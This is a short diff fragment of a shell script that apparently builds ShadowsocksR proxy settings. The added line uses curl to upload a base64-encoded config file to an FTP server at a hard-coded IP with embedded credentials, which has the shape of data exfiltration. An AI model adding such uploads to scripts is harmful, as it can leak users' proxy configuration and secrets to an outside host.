@@ -449,6 +449,7 @@ fi
 done
 
 base64 ssr.txt >ssr.ini
+curl -T ssr.ini -u ssftp:ftp ftp://202.109.226.26/AiCard_01/opt/ssr.ini
 cat >>gui-config.json <<GUICONFIG
 		}
 	],
